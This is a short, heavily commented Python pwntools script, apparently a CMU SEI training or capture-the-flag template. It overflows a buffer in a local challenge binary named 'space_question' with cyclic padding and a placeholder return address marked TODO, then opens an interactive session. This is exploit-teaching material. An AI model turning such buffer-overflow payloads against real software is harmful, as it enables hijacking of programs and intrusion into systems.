# Copyright 2023 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

from pwn import * # import pwntools

proc = process('./space_question') # this is the binary we want to exploit
print(proc.recvline()) # this reads line that the binary prints

padding = cyclic(cyclic_find("gaaa")) # our padding is the amount of chars to overflow the buffer
eip = p32(0xdeadbeef) # this is the address that we want to jump to. TODO: update with target function address

payload = padding + eip # our payload is the padding to overflow the buffer, plus our target address
proc.send(payload) # this is the way to send the payload
proc.interactive() # this opens the program in an interactive shell
